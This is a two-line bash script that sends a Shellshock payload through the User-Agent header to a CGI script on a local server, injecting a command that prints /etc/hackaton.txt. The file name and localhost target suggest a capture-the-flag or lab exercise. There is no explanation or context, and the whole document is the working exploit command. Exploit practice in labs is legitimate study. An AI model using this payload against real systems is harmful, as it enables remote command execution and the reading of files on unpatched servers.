#!/bin/bash

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/hackaton.txt;'" http://127.0.0.1:8080/cgi-bin/stats
